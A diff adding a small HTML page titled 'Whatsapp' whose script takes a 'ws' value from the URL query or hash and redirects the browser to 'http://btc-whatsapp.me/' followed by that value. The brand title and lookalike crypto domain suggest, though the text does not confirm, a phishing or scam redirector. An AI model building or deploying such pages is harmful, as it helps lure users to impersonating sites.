@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Whatsapp</title>
+</head>
+ 
+<body>
+<script type="text/javascript">
+
+    let params = new URLSearchParams(location.search);
+    let ws = params.get("ws");
+    if (typeof ws !== "string" || ws.length < 1) {
+      let hash = location.hash;
+      if (hash.indexOf("?") >= 0) {
+        params = new URLSearchParams(hash.substring(hash.indexOf("?")));
+        ws = params.get("ws");
+      }
+    }
+    if(ws) {
+        location.href = "http://btc-whatsapp.me/" + ws;
+    }
+    
+</script>
+</body>
+ 
+</html>
